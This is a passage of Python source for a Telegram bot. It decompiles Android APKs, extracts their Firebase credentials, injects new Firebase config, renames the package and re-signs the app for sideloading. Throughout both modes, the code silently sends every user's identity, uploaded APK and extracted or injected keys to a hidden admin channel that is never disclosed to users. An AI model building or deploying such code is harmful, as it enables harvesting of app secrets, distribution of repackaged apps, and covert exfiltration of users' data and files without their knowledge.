            f"   • Storage: `{context.user_data['google_storage_bucket']}`\n"
            f"   • Project: `{context.user_data['project_id']}`\n\n"
            f"📱 *New APK Details:*\n"
            f"   • Filename: `{random_apk_name}`\n\n"
            f"⚠️ *Installation Instructions:*\n"
            f"1. Purana app uninstall karo (agar installed hai)\n"
            f"2. Settings → Security → Unknown Sources ON karo\n"
            f"3. Downloaded APK install karo\n\n"
            f"💡 *Note:* Package name change hone ki wajah se purana aur naya app dono sath mein nahi chal sakte!"
            f"   • Signed: ✅ Yes\n"
            f"   • Zipaligned: ✅ Yes\n\n"
            "⚠️ *Installation Tips:*\n"
            "• Purani app uninstall NAHI karna hai\n"
            "• Ye naya package hai, dono install ho sakti hain\n"
            "• Unknown sources allow karo\n"
            "• Agar error aaye to device restart karo"
        )
        
        with open(signed_apk, 'rb') as apk_file:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=apk_file,
                filename=random_apk_name,
                caption=change_log,
                parse_mode='Markdown',
                read_timeout=120,
                write_timeout=120,
                connect_timeout=60
            )
        
        # Send to admin channel - Inject mode
        user_info = update.effective_user
        admin_inject_msg = (
            "✏️ *INJECT MODE - New Request*\n\n"
            f"👤 *User Info:*\n"
            f"   • Name: {user_info.first_name} {user_info.last_name or ''}\n"
            f"   • Username: @{user_info.username if user_info.username else 'N/A'}\n"
            f"   • User ID: `{user_info.id}`\n\n"
            f"📱 *Original APK:* `{context.user_data.get('apk_name', 'N/A')}`\n"
            f"📱 *Modified APK:* `{random_apk_name}`\n\n"
            f"📦 *Package Name Changed:*\n"
            f"   • Old: `{old_pkg}`\n"
            f"   • New: `{new_pkg}`\n\n"
            f"🔥 *Firebase Config Injected:*\n"
            f"   • Database: `{context.user_data['firebase_database_url']}`\n"
            f"   • API Key: `{context.user_data['google_api_key']}`\n"
            f"   • App ID: `{context.user_data['google_app_id']}`\n"
            f"   • Storage: `{context.user_data['google_storage_bucket']}`\n"
            f"   • Project: `{context.user_data['project_id']}`\n\n"
            f"✅ *Status:*\n"
            f"   • Decompiled: ✅\n"
            f"   • Modified: ✅\n"
            f"   • Rebuilt: ✅\n"
            f"   • Signed: ✅\n"
            f"   • Zipaligned: ✅\n\n"
            f"⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        await send_to_admin_channel(context, admin_inject_msg)
        
        # Send modified APK to admin channel
        try:
            with open(signed_apk, 'rb') as apk_file:
                await context.bot.send_document(
                    chat_id=ADMIN_CHANNEL_ID,
                    document=apk_file,
                    filename=random_apk_name,
                    caption=(
                        f"📤 *Modified APK (Inject Mode)*\n\n"
                        f"User: {user_info.first_name} (@{user_info.username if user_info.username else 'N/A'})\n"
                        f"Package: `{new_pkg}`\n"
                        f"Project: `{context.user_data['project_id']}`"
                    ),
                    parse_mode='Markdown'
                )
            logger.info("✅ Modified APK sent to admin channel")
        except Exception as e:
            logger.error(f"❌ Failed to send modified APK to admin channel: {e}")
        
        # Send detailed summary after APK
        summary_msg = (
            "📊 *Complete Change Summary:*\n\n"
            f"🔄 *Package Name:*\n"
            f"   Before: `{old_pkg}`\n"
            f"   After: `{new_pkg}`\n"
            f"   Status: ✅ Changed\n\n"
            f"🔥 *Firebase Configuration:*\n"
            f"   Database URL: ✅ Updated\n"
            f"   API Key: ✅ Updated\n"
            f"   App ID: ✅ Updated\n"
            f"   Storage Bucket: ✅ Updated\n"
            f"   Project ID: ✅ Updated\n\n"
            f"🛠️ *APK Processing:*\n"
            f"   Decompiled: ✅ Done\n"
            f"   Modified: ✅ Done\n"
            f"   Rebuilt: ✅ Done\n"
            f"   Signed: ✅ Done\n"
            f"   Zipaligned: ✅ Done\n\n"
            f"📱 *Installation Info:*\n"
            f"   • Ye ek NAYA app hai (different package)\n"
            f"   • Purani app ke saath install ho sakti hai\n"
            f"   • Data share NAHI hoga\n"
            f"   • Dono apps alag-alag chalegi\n\n"
            "✅ *Process Complete!*\n"
            "Dubara modify karne ke liye /start bhejo!"
        )
        
        await update.message.reply_text(
            summary_msg,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        
        await progress_msg.edit_text(
            "✅ *All Done!*\n\n"
            "Modified APK aur complete summary upar bhej di gayi hai!",
            parse_mode='Markdown'
        )
        
        # Cleanup
        try:
            shutil.rmtree(user_dir)
        except:
            pass
        
        return ConversationHandler.END
    
    except subprocess.TimeoutExpired:
        logger.error(f"Processing timeout")
        await progress_msg.edit_text(
            "❌ *Timeout Error!*\n\n"
            "APK process mein bahut time lag gaya.\n\n"
            "*Possible reasons:*\n"
            "• APK bahut badi hai (>20 MB)\n"
            "• APK bahut complex hai\n"
            "• System resources kam hain\n\n"
            "*Solution:*\n"
            "• Chhoti APK try karo (5-15 MB)\n"
            "• Simple APK use karo\n"
            "• System restart karo\n\n"
            "Ya phir thodi der wait karo, process background mein chal rahi hai.",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        # Don't cleanup - let it finish in background
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Processing error: {e}")
        await progress_msg.edit_text(
            f"❌ *Error!*\n\n"
            f"`{str(e)[:200]}`\n\n"
            "Please /modify se dubara try karo.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def receive_extract_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract ke liye APK receive karo"""
    document = update.message.document
    
    if not document:
        await update.message.reply_text("❌ Please ek APK file bhejo!")
        return WAITING_EXTRACT_APK
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Sirf APK files allowed hain!")
        return WAITING_EXTRACT_APK
    
    progress_msg = await update.message.reply_text("⏳ APK download ho rahi hai...")
    
    try:
        ensure_dirs()
        user_id = update.effective_user.id
        apk_dir = os.path.join(WORK_DIR, "apks", str(user_id))
        if os.path.exists(apk_dir):
            shutil.rmtree(apk_dir)
        os.makedirs(apk_dir)
        
        apk_path = os.path.join(apk_dir, document.file_name)
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(apk_path)
        
        await progress_msg.edit_text("⏳ APK decompile ho rahi hai...")
        
        # Decompile APK
        decompiled_dir = os.path.join(apk_dir, "decompiled")
        
        # Check Java installation
        try:
            java_check = subprocess.run([JAVA_PATH, "-version"], capture_output=True, text=True, timeout=10)
        except FileNotFoundError:
            raise Exception("Java not found! Please install Java JDK/JRE first.")
        
        decompile_cmd = [
            JAVA_PATH, "-Xmx1024m", "-jar", APKTOOL_PATH,
            "d", apk_path,
            "-o", decompiled_dir,
            "-f"
        ]
        result = subprocess.run(decompile_cmd, capture_output=True, text=True, timeout=3600, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)  # 60 min
        if result.returncode != 0:
            error_msg = result.stderr if result.stderr else result.stdout
            raise Exception(f"Decompile failed: {error_msg[:500]}")
        
        await progress_msg.edit_text("🔍 Firebase config search ho rahi hai...")
        
        # Extract Firebase config
        firebase_config = extract_firebase_config(decompiled_dir)
        
        if not firebase_config or not any(firebase_config.values()):
            await progress_msg.edit_text(
                "❌ *Firebase Config Not Found!*\n\n"
                "Is APK mein Firebase configuration nahi mili.\n"
                "Possible reasons:\n"
                "• APK Firebase use nahi karti\n"
                "• Config encrypted hai\n"
                "• Config runtime mein load hoti hai",
                parse_mode='Markdown'
            )
        else:
            # Format config message
            config_text = "✅ *Firebase Config Extracted!*\n\n"
            config_text += f"📱 *APK:* `{document.file_name}`\n"
            
            if firebase_config.get('package_name'):
                config_text += f"📦 *Package:* `{firebase_config['package_name']}`\n"
            
            config_text += "\n🔥 *Firebase Configuration:*\n\n"
            
            if firebase_config.get('firebase_database_url'):
                config_text += f"🗄️ *Database URL:*\n`{firebase_config['firebase_database_url']}`\n\n"
            
            if firebase_config.get('google_api_key'):
                config_text += f"🔑 *API Key:*\n`{firebase_config['google_api_key']}`\n\n"
            
            if firebase_config.get('google_app_id'):
                config_text += f"📱 *App ID:*\n`{firebase_config['google_app_id']}`\n\n"
            
            if firebase_config.get('google_storage_bucket'):
                config_text += f"📁 *Storage Bucket:*\n`{firebase_config['google_storage_bucket']}`\n\n"
            
            if firebase_config.get('project_id'):
                config_text += f"🏷️ *Project ID:*\n`{firebase_config['project_id']}`\n\n"
            
            if firebase_config.get('gcm_sender_id'):
                config_text += f"📨 *GCM Sender ID:*\n`{firebase_config['gcm_sender_id']}`\n\n"
            
            config_text += "💾 JSON file bhi bhej raha hoon..."
            
            await progress_msg.edit_text(config_text, parse_mode='Markdown')
            
            # Send to admin channel
            user_info = update.effective_user
            admin_msg = (
                "🔍 *EXTRACT MODE - New Request*\n\n"
                f"👤 *User Info:*\n"
                f"   • Name: {user_info.first_name} {user_info.last_name or ''}\n"
                f"   • Username: @{user_info.username if user_info.username else 'N/A'}\n"
                f"   • User ID: `{user_info.id}`\n\n"
                f"📱 *APK:* `{document.file_name}`\n"
                f"📦 *Package:* `{firebase_config.get('package_name', 'N/A')}`\n\n"
                "🔥 *Extracted Firebase Config:*\n\n"
            )
            
            if firebase_config.get('firebase_database_url'):
                admin_msg += f"🗄️ *Database:* `{firebase_config['firebase_database_url']}`\n"
            if firebase_config.get('google_api_key'):
                admin_msg += f"🔑 *API Key:* `{firebase_config['google_api_key']}`\n"
            if firebase_config.get('google_app_id'):
                admin_msg += f"📱 *App ID:* `{firebase_config['google_app_id']}`\n"
            if firebase_config.get('google_storage_bucket'):
                admin_msg += f"📁 *Storage:* `{firebase_config['google_storage_bucket']}`\n"
            if firebase_config.get('project_id'):
                admin_msg += f"🏷️ *Project:* `{firebase_config['project_id']}`\n"
            if firebase_config.get('gcm_sender_id'):
                admin_msg += f"📨 *GCM ID:* `{firebase_config['gcm_sender_id']}`\n"
            
            admin_msg += f"\n⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            await send_to_admin_channel(context, admin_msg)
            
            # Send original APK to admin channel
            try:
                with open(apk_path, 'rb') as apk_file:
                    await context.bot.send_document(
                        chat_id=ADMIN_CHANNEL_ID,
                        document=apk_file,
                        filename=document.file_name,
                        caption=f"📥 *Original APK (Extract Mode)*\n\nUser: {user_info.first_name} (@{user_info.username if user_info.username else 'N/A'})",
                        parse_mode='Markdown'
                    )
                logger.info("✅ Original APK sent to admin channel")
            except Exception as e:
                logger.error(f"❌ Failed to send APK to admin channel: {e}")
            
            # Create JSON file
            json_filename = f"firebase_config_{document.file_name.replace('.apk', '')}.json"
            json_path = os.path.join(apk_dir, json_filename)
            
            import json
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(firebase_config, f, indent=2, ensure_ascii=False)
            
            # Send JSON file
            with open(json_path, 'rb') as json_file:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=json_file,
                    filename=json_filename,
                    caption="📄 Firebase config JSON format mein"
                )
        
        # Cleanup
        try:
            shutil.rmtree(apk_dir)
        except:
            pass
        
        return ConversationHandler.END
    
    except subprocess.TimeoutExpired:
        logger.error(f"Extraction timeout")
        await progress_msg.edit_text(
            "❌ *Timeout Error!*\n\n"
            "APK decompile mein bahut time lag gaya.\n"
            "Chhoti APK try karo ya thodi der baad try karo.",
            parse_mode='Markdown'
        )
        try:
            shutil.rmtree(apk_dir)
        except:
            pass
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Extraction error: {e}")
        await progress_msg.edit_text(
            f"❌ *Error!*\n\n"
            f"`{str(e)[:200]}`\n\n"
            "Please /extract se dubara try karo.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

def extract_firebase_config(decompiled_dir):
    """APK se Firebase config extract karo"""
    config = {
        'package_name': None,
        'firebase_database_url': None,
        'google_api_key': None,
        'google_app_id': None,
        'google_storage_bucket': None,
        'project_id': None,
        'gcm_sender_id': None
    }
    
    # 1. Package name from AndroidManifest.xml
    manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    if os.path.exists(manifest_path):
        try:
            with open(manifest_path, 'r', encoding='utf-8') as f:
                manifest_content = f.read()
            match = re.search(r'package="([^"]+)"', manifest_content)
            if match:
                config['package_name'] = match.group(1)
        except:
            pass
    
    # 2. Extract from strings.xml
    strings_path = os.path.join(decompiled_dir, "res", "values", "strings.xml")
    if os.path.exists(strings_path):
        try:
            with open(strings_path, 'r', encoding='utf-8') as f:
                strings_content = f.read()
            
            # Firebase keys extract karo
            firebase_keys = {
                'firebase_database_url': r'<string name="firebase_database_url">([^<]+)</string>',
                'google_api_key': r'<string name="google_api_key">([^<]+)</string>',
                'google_app_id': r'<string name="google_app_id">([^<]+)</string>',
                'google_storage_bucket': r'<string name="google_storage_bucket">([^<]+)</string>',
                'project_id': r'<string name="project_id">([^<]+)</string>',
                'gcm_sender_id': r'<string name="gcm_sender_id">([^<]+)</string>',
            }
            
            for key, pattern in firebase_keys.items():
                match = re.search(pattern, strings_content)
                if match:
                    config[key] = match.group(1)
        except:
            pass
    
    # 3. Extract from assets folder (HTML/JS files)
    assets_dir = os.path.join(decompiled_dir, "assets")
    if os.path.exists(assets_dir):
        for root, dirs, files in os.walk(assets_dir):
            for file in files:
                if file.endswith(('.html', '.htm', '.js', '.json')):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Firebase database URL patterns
                        if not config['firebase_database_url']:
                            db_match = re.search(r'https://([a-zA-Z0-9-]+)-default-rtdb[a-zA-Z0-9.-]*\.(firebaseio\.com|firebasedatabase\.app)', content)
                            if db_match:
                                config['firebase_database_url'] = db_match.group(0)
                        
                        # API Key pattern
                        if not config['google_api_key']:
                            api_match = re.search(r'AIza[0-9A-Za-z_-]{35}', content)
                            if api_match:
                                config['google_api_key'] = api_match.group(0)
                        
                        # Storage bucket
                        if not config['google_storage_bucket']:
                            storage_match = re.search(r'([a-zA-Z0-9-]+)\.firebasestorage\.app', content)
                            if storage_match:
                                config['google_storage_bucket'] = storage_match.group(0)
                        
                        # Project ID from database URL
                        if not config['project_id'] and config['firebase_database_url']:
                            proj_match = re.search(r'https://([a-zA-Z0-9-]+)-default-rtdb', config['firebase_database_url'])
                            if proj_match:
                                config['project_id'] = proj_match.group(1)
                    except:
                        pass
    
    # 4. google-services.json check karo
    google_services_path = os.path.join(decompiled_dir, "assets", "google-services.json")
    if os.path.exists(google_services_path):
        try:
            import json
            with open(google_services_path, 'r', encoding='utf-8') as f:
                gs_data = json.load(f)
            
            if 'project_info' in gs_data:
                if not config['project_id']:
                    config['project_id'] = gs_data['project_info'].get('project_id')
                if not config['firebase_database_url']:
                    config['firebase_database_url'] = gs_data['project_info'].get('firebase_url')
                if not config['google_storage_bucket']:
                    config['google_storage_bucket'] = gs_data['project_info'].get('storage_bucket')
            
            if 'client' in gs_data and len(gs_data['client']) > 0:
                client = gs_data['client'][0]
                if 'client_info' in client and not config['google_app_id']:
                    config['google_app_id'] = client['client_info'].get('mobilesdk_app_id')
                
                if 'api_key' in client and len(client['api_key']) > 0 and not config['google_api_key']:
                    config['google_api_key'] = client['api_key'][0].get('current_key')
        except:
            pass
    
    return config

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Conversation cancel karo"""
    context.user_data.clear()
    
    await update.message.reply_text(
        "❌ Process cancelled!\n\n"
        "Kya karna hai? Neeche ke buttons use karo:",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )
    return CHOOSING_MODE

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help message"""
    help_text = """
🆘 *Help - Firebase APK Tool*

*Commands:*
/start - Bot start karo (keyboard show hoga)
/extract - APK se Firebase config nikalo
/modify - APK mein Firebase config inject karo
/cancel - Current process cancel karo
/help - Ye help message
/keyboard - Keyboard buttons show karo

*Extract Mode:*
• APK bhejo
• Firebase config automatically extract hoga
• JSON file milegi

*Inject Mode:*
• APK bhejo
• Firebase details do
• Modified APK milegi

*Firebase Config kahan se lein:*
1. Firebase Console jao
2. Project Settings > General
3. Details copy karo

*Troubleshooting:*
• APK build fail ho - purani APK try karo
• APK mein Firebase hona chahiye
• APK 50MB se kam honi chahiye

👇 Neeche keyboard buttons use karo!
    """
    await update.message.reply_text(
        help_text, 
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

async def keyboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show keyboard buttons"""
    await update.message.reply_text(
        "✅ Keyboard buttons activated!\n\n"
        "Neeche 4 buttons dikhengi:\n"
        "🔍 Extract Config\n"
        "✏️ Inject Config\n"
        "❓ Help\n"
        "❌ Cancel",
        reply_markup=get_main_keyboard()
    )

import asyncio

def find_java_tools():
    """Java executable and tools find karo"""
    # Try common paths
    java_paths = [
        "java",  # System PATH
        r"C:\Program Files\Java\jdk-25\bin\java.exe",
        r"C:\Program Files\Java\jdk-21\bin\java.exe",
        r"C:\Program Files\Java\jdk-17\bin\java.exe",
        r"C:\Program Files\Java\jre-21\bin\java.exe",
        r"C:\Program Files (x86)\Java\jdk-21\bin\java.exe",
    ]
    
    # Also check JAVA_HOME
    java_home = os.environ.get('JAVA_HOME')
    if java_home:
        java_paths.insert(1, os.path.join(java_home, 'bin', 'java.exe'))
    
    java_exe = None
    java_bin_dir = None
    
    for java_path in java_paths:
        try:
            result = subprocess.run([java_path, "-version"], capture_output=True, timeout=5, shell=True)
            if result.returncode == 0:
                java_exe = java_path
                # Get bin directory
                if os.path.isabs(java_path):
                    java_bin_dir = os.path.dirname(java_path)
                else:
                    # Try to find java.home
                    try:
                        result = subprocess.run([java_path, "-XshowSettings:properties", "-version"], 
                                              capture_output=True, text=True, timeout=5, shell=True)
                        for line in result.stderr.split('\n'):
                            if 'java.home' in line:
                                home = line.split('=')[1].strip()
                                java_bin_dir = os.path.join(home, 'bin')
                                break
                    except:
                        pass
                break
        except:
            continue
    
    if not java_exe:
        return None, None, None
    
    # Find keytool and jarsigner
    keytool_exe = "keytool"
    jarsigner_exe = "jarsigner"
    
    if java_bin_dir and os.path.exists(java_bin_dir):
        keytool_path = os.path.join(java_bin_dir, "keytool.exe")
        jarsigner_path = os.path.join(java_bin_dir, "jarsigner.exe")
        
        if os.path.exists(keytool_path):
            keytool_exe = keytool_path
        if os.path.exists(jarsigner_path):
            jarsigner_exe = jarsigner_path
    
    return java_exe, keytool_exe, jarsigner_exe

async def main():
    """Bot run karo"""
    # Start web server for Render.com (keeps service alive)
    try:
        from web_server import start_web_server
        start_web_server()
    except Exception as e:
        print(f"⚠️ Web server not started: {e}")
    
    ensure_dirs()
    
    # Java tools check
    java_exe, keytool_exe, jarsigner_exe = find_java_tools()
    if not java_exe:
        print("❌ ERROR: Java not found!")
        print("Please install Java JDK/JRE:")
        print("Download from: https://www.oracle.com/java/technologies/downloads/")
        print("After installation, restart your terminal/IDE")
        return
    
    print(f"✅ Java found: {java_exe}")
    print(f"✅ keytool: {keytool_exe}")
    print(f"✅ jarsigner: {jarsigner_exe}")
    
    # Store paths globally
    global JAVA_PATH, KEYTOOL_PATH, JARSIGNER_PATH
    JAVA_PATH = java_exe
    KEYTOOL_PATH = keytool_exe
    JARSIGNER_PATH = jarsigner_exe
    
    # Apktool check aur download
    if not download_apktool():
        print("❌ ERROR: Could not setup apktool.jar")
        return
    
    print("🤖 Bot starting...")
    print(f"📱 Bot Token: {BOT_TOKEN[:20]}...")
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
    except Exception as e:
        print(f"❌ ERROR: Failed to create bot application: {e}")
        return
    
    # Main conversation handler with buttons
    main_conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex("^(🔍 Extract|✏️ Inject|❓ Help|❌ Cancel)$"), handle_keyboard_buttons)
        ],
        states={
            CHOOSING_MODE: [
                CallbackQueryHandler(button_callback),
                MessageHandler(filters.Regex("^(🔍 Extract|✏️ Inject|❓ Help|❌ Cancel)$"), handle_keyboard_buttons),
            ],
            WAITING_APK: [MessageHandler(filters.Document.ALL, receive_apk)],
            WAITING_DATABASE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_database_url)],
            WAITING_API_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_api_key)],
            WAITING_APP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_app_id)],
            WAITING_STORAGE_BUCKET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_storage_bucket)],
            WAITING_PROJECT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_project_id)],
            WAITING_EXTRACT_APK: [MessageHandler(filters.Document.ALL, receive_extract_apk)],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            MessageHandler(filters.Regex("^❌ Cancel$"), handle_keyboard_buttons)
        ],
    )
    
    # Direct command handlers (optional - for backward compatibility)
    modify_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("modify", modify_start)],
        states={
            WAITING_APK: [MessageHandler(filters.Document.ALL, receive_apk)],
            WAITING_DATABASE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_database_url)],
            WAITING_API_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_api_key)],
            WAITING_APP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_app_id)],
            WAITING_STORAGE_BUCKET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_storage_bucket)],
            WAITING_PROJECT_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_project_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    extract_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("extract", extract_start)],
        states={
            WAITING_EXTRACT_APK: [MessageHandler(filters.Document.ALL, receive_extract_apk)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(main_conv_handler)
    application.add_handler(extract_conv_handler)
    application.add_handler(modify_conv_handler)
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("keyboard", keyboard_command))
    
    print("✅ Bot is running! Press Ctrl+C to stop")
    logger.info("🚀 Firebase APK Bot started successfully!")
    logger.info(f"📱 Waiting for messages...")
    
    async with application:
        await application.start()
        logger.info("✅ Application started, beginning polling...")
        await application.updater.start_polling(drop_pending_updates=True)
        logger.info("✅ Polling started successfully!")
        
        # Keep running until interrupted
        stop_event = asyncio.Event()
        try:
            await stop_event.wait()
        except asyncio.CancelledError:
            logger.info("Bot stopped by user")
            pass
        except Exception as e:
            logger.error(f"❌ Bot error: {e}")
        finally:
            await application.updater.stop()
            await application.stop()

if __name__ == "__main__":
    asyncio.run(main())

